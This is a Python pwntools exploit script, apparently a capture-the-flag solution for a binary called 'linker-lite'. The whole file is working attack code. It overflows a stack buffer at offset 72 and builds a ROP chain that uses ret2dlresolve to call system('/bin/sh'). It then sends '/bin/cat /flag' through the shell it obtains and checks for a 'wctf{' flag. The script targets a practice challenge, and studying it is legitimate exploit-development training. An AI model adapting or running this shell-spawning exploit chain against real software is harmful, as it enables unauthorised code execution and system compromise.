#!/usr/bin/env python3
from pwn import *
import sys
context.binary = elf = ELF("./linker-lite")
p = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process("./linker-lite")
p.recvuntil(b"send plugin blob:")
dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = ROP(elf)
rop.raw(rop.ret)                              # movaps alignment
rop.call(elf.sym.read_full, [0, dl.data_addr, len(dl.payload)])  # read the complete stage
rop.ret2dlresolve(dl)
OFFSET = 72                                   # buf[64] + saved rbp
p.send(flat({OFFSET: rop.chain()}).ljust(256, b"\x00"))  # fill the 256-byte vuln read exactly so the staged dl.payload isn't swallowed by it (socket coalescing)
p.sendline(dl.payload)
p.sendline(b"/bin/cat /flag")   # absolute path: minimal jail chroot has no PATH/coreutils
out = p.recvall(timeout=3)
sys.stdout.buffer.write(out)
assert b"wctf{" in out, "flag not found"
